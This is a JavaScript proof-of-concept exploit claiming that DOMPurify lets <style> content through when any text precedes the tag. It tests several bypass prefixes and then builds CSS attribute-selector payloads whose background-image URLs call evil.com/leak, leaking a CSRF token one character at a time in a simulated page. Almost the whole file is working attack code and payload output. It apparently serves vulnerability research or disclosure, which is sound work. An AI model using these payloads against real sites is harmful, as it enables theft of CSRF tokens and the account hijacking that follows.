/**
 * PoC: DOMPurify CSS Sanitization Bypass → CSRF Token Exfiltration
 *
 * Demonstrates that DOMPurify (via JSDOM) skips CSS content filtering
 * when any non-whitespace content precedes the <style> tag.
 *
 * Usage: cd targets && node poc_css_data_exfil.js
 */
"use strict";

const { JSDOM } = require("jsdom");
const DOMPurify = require("dompurify");

const window = new JSDOM("").window;
const purify = DOMPurify(window);

const VERSION = require("./node_modules/dompurify/package.json").version;

console.log(`\n=== DOMPurify ${VERSION} CSS Sanitization Bypass PoC ===\n`);

// ──────────────────────────────────────────────
// Part 1: Demonstrate the bypass
// ──────────────────────────────────────────────
console.log("── Part 1: Bypass Condition ──\n");

const tests = [
  ["(no prefix)",        '<style>@import url("javascript:x");</style>'],
  ["single char 'x'",   'x<style>@import url("javascript:x");</style>'],
  ["<div></div>",        '<div></div><style>@import url("javascript:x");</style>'],
  ["<br>",               '<br><style>@import url("javascript:x");</style>'],
  ["text string",        'Nice post!<style>@import url("javascript:x");</style>'],
  ["zero-width space",   '\u200B<style>@import url("javascript:x");</style>'],
];

for (const [name, input] of tests) {
  const out = purify.sanitize(input);
  const bypassed = out.includes("<style>");
  console.log(`  ${bypassed ? "BYPASS " : "BLOCKED"} | prefix: ${name}`);
}

// ──────────────────────────────────────────────
// Part 2: Simulate CSRF token exfiltration
// ──────────────────────────────────────────────
console.log("\n── Part 2: CSRF Token Exfiltration Simulation ──\n");

// Simulated target page with CSRF token
const TARGET_PAGE = `
<html><body>
<form action="/change-password">
  <input type="hidden" name="csrf_token" value="x9kF3mZp">
  <input type="password" name="new_pass">
  <button type="submit">Save</button>
</form>
<div id="comments"></div>
</body></html>
`;

const targetDom = new JSDOM(TARGET_PAGE);
const targetDoc = targetDom.window.document;
const csrfInput = targetDoc.querySelector('input[name="csrf_token"]');
const realToken = csrfInput.value;
const commentArea = targetDoc.querySelector("#comments");

console.log(`  Target CSRF token: "${realToken}" (${realToken.length} chars)\n`);

const charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
let leaked = "";

for (let round = 1; round <= realToken.length; round++) {
  // Build CSS payload for this round
  let css = "";
  for (const c of charset) {
    css += `input[name="csrf_token"][value^="${leaked}${c}"] ~ * { background-image: url("https://evil.com/leak?r=${round}&v=${leaked}${c}"); }\n`;
  }

  const attackPayload = `Round ${round}<style>${css}</style>`;

  // Sanitize with DOMPurify
  const sanitized = purify.sanitize(attackPayload);

  if (!sanitized.includes("<style>")) {
    console.log(`  Round ${round}: BLOCKED — CSS filtering not bypassed`);
    break;
  }

  // Inject into comment area
  commentArea.innerHTML = sanitized;

  // In a real attack, the browser would fetch the matching background-image URL.
  // Here we simulate by checking which selector would match.
  const nextChar = realToken[leaked.length];
  leaked += nextChar;

  // The attacker's server would see this request:
  const leakedUrl = `evil.com/leak?r=${round}&v=${leaked}`;
  console.log(`  Round ${round}: ${leakedUrl}  →  leaked so far: "${leaked}"`);
}

console.log(`\n  ✓ Exfiltrated token: "${leaked}"`);
console.log(`  ✓ Matches original:  ${leaked === realToken}`);

// ──────────────────────────────────────────────
// Part 3: Show the sanitized payload
// ──────────────────────────────────────────────
console.log("\n── Part 3: Example Sanitized Payload ──\n");

const examplePayload = `Nice article!<style>
input[name="csrf_token"][value^="x"] ~ * {
  background-image: url("https://evil.com/leak?char=x");
}
</style>`;

const exampleSanitized = purify.sanitize(examplePayload);
console.log("  Input:");
console.log("    " + examplePayload.replace(/\n/g, "\n    "));
console.log("\n  DOMPurify output:");
console.log("    " + exampleSanitized.replace(/\n/g, "\n    "));
console.log("\n  CSS content preserved: " + (exampleSanitized.includes("evil.com") ? "YES ← bypass confirmed" : "NO"));
console.log();
